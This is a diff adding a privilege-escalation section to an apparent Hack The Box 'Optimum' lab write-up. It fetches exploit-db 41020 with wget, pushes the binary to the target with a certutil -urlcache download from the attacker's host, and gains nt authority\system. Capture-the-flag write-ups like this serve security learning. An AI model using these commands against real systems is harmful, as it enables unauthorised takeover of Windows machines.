@@ -39,8 +39,62 @@ ran the exploit and boom got shell as `optimum\kostas`
 
 checking systeminfo, we can see the OS version is `6.3.9600 N/A Build 9600`, let's check for exploit online.
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c4fbc557-30c5-434a-af8f-9007073da1c4)
 
+found an exploit on [exploitdb](https://www.exploit-db.com/exploits/41020).
 
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Optimum]
+└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
+--2023-05-16 20:33:32--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
+Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
+Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 560128 (547K) [application/octet-stream]
+Saving to: ‘41020.exe’
 
+41020.exe                                 100%[====================================================================================>] 547.00K  1.02MB/s    in 0.5s    
 
+2023-05-16 20:33:33 (1.02 MB/s) - ‘41020.exe’ saved [560128/560128]
+```
+downloaded the exe binary file.
+
+```
+certutil -urlcache -f http://10.10.14.14/41020.exe 41020.exe
+```
+Send the binary exploit to the target.
+
+```
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EE82-226D
+
+ Directory of C:\Users\kostas\Desktop
+
+23/05/2023  07:37     <DIR>          .
+23/05/2023  07:37     <DIR>          ..
+23/05/2023  07:31            560.128 41020.exe
+23/05/2023  06:08              1.048 47558.py
+18/03/2017  03:11            760.320 hfs.exe
+23/05/2023  07:16             13.893 Invoke-MS16032.ps1
+23/05/2023  07:14             11.461 privesc.ps1
+23/05/2023  07:37             73.802 shell.exe
+23/05/2023  12:53                 34 user.txt
+23/05/2023  05:11                334 windowsprivchecker.bat
+               8 File(s)      1.421.020 bytes
+               2 Dir(s)   5.651.222.528 bytes free
+
+C:\Users\kostas\Desktop>.\41020.exe
+.\41020.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\kostas\Desktop>
+```
+ran the exploit and boom got `nt authority\system`
 
